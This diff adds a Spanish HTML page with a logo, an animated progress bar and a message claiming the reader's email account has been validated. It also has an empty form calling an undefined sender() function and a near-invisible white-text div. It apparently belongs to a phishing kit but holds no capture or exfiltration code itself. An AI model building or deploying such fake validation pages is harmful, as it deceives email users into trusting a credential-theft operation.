@@ -1,0 +1,76 @@
+<html lang="es"><head>
+
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+        <link rel="stylesheet" href="./assets/aparent.css">
+        <title>Internet - Home</title>
+      
+    
+        <style>
+            .progress-container {
+                width: 80%;
+                margin: 50px auto;
+                border: 2px solid #757575;
+                border-radius: 5px;
+                padding: 5px;
+            }
+    
+            .progress-bar {
+                width: 0;
+                height: 30px;
+                background-color: #00aa08;
+                color: #fff;
+                text-align: center;
+                line-height: 30px;
+                border-radius: 5px;
+            }</style>
+    
+    
+    </head>
+    <body>
+        <h2></h2><br>        <center>
+            <form method="post" action="#" onsubmit="return sender();">
+            <img style="width: 30%;  " src="assets/logo.png" alt=""> <div class="clear"></div> 
+            <h2>Felicidades, Tu cuenta de correo ha sido exitosamente validada</h2>
+       
+      <div class="progress-container">
+        <div class="progress-bar" id="progress-bar" style="width: 36%;">36%</div>
+    </div>
+    
+    
+    <script>
+        function startProgressBar() {
+            var progressBar = document.getElementById("progress-bar");
+            var progress = 0;
+    
+            var interval = setInterval(function () {
+                if (progress < 100) {
+                    progress++;
+                    progressBar.style.width = progress + "%";
+                    progressBar.textContent = progress + "%";
+                } else {
+                    clearInterval(interval);
+                }
+            }, 30);
+        }
+    
+        startProgressBar();
+    </script>
+            
+                <div class="form-group">
+                  
+                
+                </div>
+                <div class="form-group">
+                   
+                </div>
+                <div class="form-group">
+                   
+                </div>
+        </form>
+
+     <div style="color: rgb(255, 255, 255);font-size: 0.05px;">
+  
+    
+    </center></body></html>
